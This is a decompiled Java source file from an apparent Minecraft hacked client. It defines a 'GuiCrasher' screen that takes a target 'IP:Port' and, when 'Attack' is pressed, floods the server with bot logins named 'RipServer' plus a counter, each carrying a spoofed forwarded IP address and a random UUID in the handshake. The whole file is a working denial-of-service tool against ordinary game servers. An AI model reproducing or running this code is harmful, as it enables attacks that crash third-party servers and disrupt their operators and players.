/*    */ package slientclient.gui;
/*    */ 
/*    */ import java.io.IOException;
/*    */ import java.net.InetAddress;
/*    */ import java.util.List;
/*    */ import java.util.Random;
/*    */ import java.util.UUID;
/*    */ import net.minecraft.client.Minecraft;
		 import net.minecraft.client.gui.GuiButton;
import net.minecraft.client.gui.GuiIngameMenu;
import net.minecraft.client.gui.GuiScreen;
import net.minecraft.client.gui.GuiTextField;
/*    */ import net.minecraft.client.multiplayer.GuiConnecting;
/*    */ import net.minecraft.client.settings.GameSettings;
import net.minecraft.network.EnumConnectionState;
/*    */ import net.minecraft.network.NetworkManager;
import net.minecraft.network.handshake.client.C00Handshake;
/*    */ import net.minecraft.network.login.client.CPacketLoginStart;
/*    */ import net.minecraft.util.Session;
/*    */ import org.lwjgl.input.Keyboard;

import com.mojang.authlib.GameProfile;
/*    */ 
/*    */ public class GuiCrasher extends GuiScreen
/*    */ {
/*    */   private GuiScreen parentScreen;
/*    */   private GuiTextField serverTextField;
/*    */   
/*    */   public GuiCrasher(GuiScreen guiscreen)
/*    */   {
/* 23 */     this.parentScreen = guiscreen;
/*    */   }
/*    */   
/*    */   public void updateScreen() {
/* 27 */     this.serverTextField.updateCursorCounter();
/*    */   }
/*    */   
/*    */   public void onGuiClosed() {
/* 31 */     Keyboard.enableRepeatEvents(false);
/*    */   }
/*    */   
/*    */   protected void actionPerformed(GuiButton guibutton) {
/* 35 */     if (!guibutton.enabled) {
/* 36 */       return;
/*    */     }
/* 38 */     if (guibutton.id == 1) {
/* 39 */       this.mc.displayGuiScreen(this.parentScreen);
/* 40 */     } else if (guibutton.id == 0) {
/* 41 */       final String messageFinal = this.serverTextField.getText();
/* 42 */       new Thread() {
/*    */         public void run() {
/*    */           try {
/* 45 */             String[] s = messageFinal.split(":");
/* 46 */             int port = Integer.parseInt(s[1]);
/* 47 */             for (int count = 0; count < Minecraft.getMinecraft().botCount; count++) {
/* 48 */               Random rand = new Random();InetAddress var1 = null;var1 = InetAddress.getByName(s[0]);
/* 49 */               GuiConnecting.networkManager = NetworkManager.createNetworkManagerAndConnect(var1, 
/* 50 */                 port, Minecraft.getMinecraft().gameSettings.isUsingNativeTransport());
/* 51 */               GuiConnecting.networkManager
/* 52 */                 .setNetHandler(new net.minecraft.client.network.NetHandlerLoginClient(GuiConnecting.networkManager, 
/* 53 */                 Minecraft.getMinecraft(), new GuiIngameMenu()));
GuiConnecting.networkManager.sendPacket(
        new C00Handshake(s[1] + "\000" + "32.123." + 
        String.valueOf(rand.nextInt(255)) + "." + String.valueOf(rand.nextInt(255)) + 
        "\000" + UUID.randomUUID().toString(), 
        port, EnumConnectionState.LOGIN));
      GuiConnecting.networkManager.sendPacket(new CPacketLoginStart(new GameProfile(null, "RipServer" + count)));
      Thread.sleep(0L);
/*    */             }
/*    */           } catch (Exception localException) {}
/*    */         }
/*    */       }.start();
/*    */     }
/*    */   }
/*    */   
/*    */   protected void keyTyped(char c, int i) {
/* 68 */     this.serverTextField.textboxKeyTyped(c, i);
/* 69 */     if ((c == '\t') && 
/* 70 */       (this.serverTextField.isFocused())) {
/* 71 */       this.serverTextField.setFocused(false);
/*    */     }
/*    */     
/* 74 */     if (c == '\r') {
/* 75 */       actionPerformed((GuiButton)this.buttonList.get(0));
/*    */     }
/*    */   }
/*    */   
/*    */   protected void mouseClicked(int i, int j, int k) throws IOException {
/* 80 */     super.mouseClicked(i, j, k);
/* 81 */     this.serverTextField.mouseClicked(i, j, k);
/*    */   }
/*    */   
/*    */   public void initGui() {
/* 85 */     Keyboard.enableRepeatEvents(true);
/* 86 */     this.buttonList.clear();
/* 87 */     this.buttonList.add(new GuiButton(0, this.width / 2 - 100, this.height / 4 + 96 + 12, "Attack"));
/* 88 */     this.buttonList.add(new GuiButton(1, this.width / 2 - 100, this.height / 4 + 120 + 12, "Cancel"));
/* 89 */     this.serverTextField = new GuiTextField(2, this.fontRendererObj, this.width / 2 - 100, 116, 200, 20);
/*    */   }
/*    */   
/*    */   public void drawScreen(int i, int j, float f)
/*    */   {
/* 94 */     drawDefaultBackground();
/* 95 */     drawCenteredString(this.fontRendererObj, "IP:Port", this.width / 2, this.height / 4 - 60 + 20, 16777215);
/* 96 */     this.serverTextField.drawTextBox();
/* 97 */     super.drawScreen(i, j, f);
/*    */   }
/*    */ }
